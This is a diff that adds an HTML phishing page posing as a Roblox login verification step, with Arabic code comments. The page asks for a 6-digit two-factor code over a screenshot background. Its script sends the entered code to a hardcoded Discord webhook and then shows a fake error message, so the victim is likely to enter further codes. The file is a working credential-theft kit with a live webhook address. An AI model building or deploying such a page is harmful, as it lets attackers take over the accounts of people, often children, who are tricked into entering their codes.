@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background-image: url('3-step.png'); /* قم بتعديل هذا إلى مسار الصورة الخاصة بك */
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .verify-container {
+            padding: 0px;
+            border-radius: 8px;
+            width: 350px;
+            text-align: center;
+        }
+        input {
+            margin: 139px 0;/*المسافه بين الحقل والحقل*/
+            margin-top: 208px; /* قيمة `margin-top` تعتمد على مقدار المسافة المطلوبة */
+            margin-left: -67px; /* قيمة `margin-left` تعتمد على مقدار المسافة المطلوبة */
+            padding: 10px;/*حجم الحقل*/
+            width: 132%;/*طول الحقل من اليمين*/
+            border: 0px solid #ffffff;
+            border-radius: 10px;/*حواف الحقل*/
+            background: rgb(0, 0, 0);
+            color: white;
+        }
+        button {
+            padding: 10px;/*تكبير الحقل من تحت*/
+            width: 138%;/*تكبير الحقل من اليمين*/
+            margin-left: -67px; /* قيمة `margin-left` تعتمد على مقدار المسافة المطلوبة */
+            border: none;
+            border-radius: 4px;/*حواف الحقل*/
+            background-color: #ffffff;
+            color: #393b3d;
+            font-size: 16px;/*تكبير الحقل*/
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #292929;
+        }
+    </style>
+</head>
+<body>
+    <div class="verify-container">
+        <form id="verifyForm">
+            <input type="text" id="inputField" placeholder="Enter 6-digit Code" required="">
+            <button type="submit"><b>Verify</b></button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('verifyForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع النموذج من الإرسال التلقائي
+            
+            var inputValue = document.getElementById('inputField').value;
+
+            // إرسال البيانات إلى سيرفر Discord
+            fetch('https://discord.com/api/webhooks/1276208020468269137/NUrusBNokpHv3v5yvq6Y9mM2nXl3nGCtdxNaM87PMZUrK_-JMTfMa_OX0snzO5tzwPld', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `cood: ${inputValue}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('خطا.');
+                    // يمكنك هنا إعادة توجيه المستخدم إلى صفحة أخرى إذا رغبت في ذلك
+                } else {
+                    alert('خطا.');
+                }
+            })
+            .catch(error => {
+                console.error('خطأ:', error);
+                alert('خطأ.');
+            });
+        });
+    </script>
+</body>
+</html>
